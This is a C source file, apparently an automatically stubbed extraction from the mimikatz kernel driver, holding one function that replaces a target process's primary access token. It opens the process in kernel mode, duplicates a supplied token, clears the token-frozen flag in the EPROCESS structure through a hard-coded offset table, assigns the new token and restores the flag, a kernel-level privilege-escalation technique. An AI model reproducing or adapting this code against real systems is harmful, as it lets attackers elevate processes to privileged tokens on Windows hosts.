#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  scalar_t__ ULONG_PTR ;
struct TYPE_3__ {int /*<<< orphan*/  Token; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
typedef  int /*<<< orphan*/  SIZE_T ;
typedef  int /*<<< orphan*/  PVOID ;
typedef  int* PULONG ;
typedef  TYPE_1__ PROCESS_ACCESS_TOKEN ;
typedef  int /*<<< orphan*/  PKIWI_BUFFER ;
typedef  scalar_t__ PEPROCESS ;
typedef  int /*<<< orphan*/  PCHAR ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  HANDLE ;

/* Variables and functions */
 scalar_t__** EPROCESS_OffSetTable ; 
 size_t EprocessFlags2 ; 
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  KernelMode ; 
 size_t KiwiOsIndex ; 
 size_t KiwiOsIndex_VISTA ; 
 scalar_t__ FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  OBJ_KERNEL_HANDLE ; 
 int /*<<< orphan*/  FUNC1 (scalar_t__,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  ProcessAccessToken ; 
 int /*<<< orphan*/  FUNC2 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC3 (scalar_t__) ; 
 int /*<<< orphan*/ * PsProcessType ; 
 int TOKEN_FROZEN_MASK ; 
 int /*<<< orphan*/  TokenPrimary ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_1__*,int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,...) ; 

NTSTATUS FUNC8(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, HANDLE hSrcToken, PEPROCESS pToProcess)
{
	PROCESS_ACCESS_TOKEN ProcessTokenInformation = {NULL, NULL};
	HANDLE hToProcess;
	PULONG pFlags2 = NULL;
	NTSTATUS status;
	HANDLE processId = FUNC2(pToProcess);
	PCHAR processName = FUNC3(pToProcess);

	status = FUNC1(pToProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hToProcess);
	if(FUNC0(status))
	{
		status = FUNC5(hSrcToken, 0, NULL, FALSE, TokenPrimary, &ProcessTokenInformation.Token);
		if(FUNC0(status))
		{
			if(KiwiOsIndex >= KiwiOsIndex_VISTA)
			{
				pFlags2 = (PULONG) (((ULONG_PTR) pToProcess) + EPROCESS_OffSetTable[KiwiOsIndex][EprocessFlags2]);
				if(*pFlags2 & TOKEN_FROZEN_MASK)
					*pFlags2 &= ~TOKEN_FROZEN_MASK;
				else
					pFlags2 = NULL;
			}

			status = FUNC6(hToProcess, ProcessAccessToken, &ProcessTokenInformation, sizeof(PROCESS_ACCESS_TOKEN));
			if(FUNC0(status))
				status = FUNC7(outBuffer, L" * to %u/%-14S\n", processId, processName);
			else
				status = FUNC7(outBuffer, L" ! ZwSetInformationProcess 0x%08x for %u/%-14S\n", status, processId, processName);

			if((KiwiOsIndex >= KiwiOsIndex_VISTA) && pFlags2)
				*pFlags2 |= TOKEN_FROZEN_MASK;

			FUNC4(ProcessTokenInformation.Token);
		}
		FUNC4(hToProcess);
	}
	return status;
}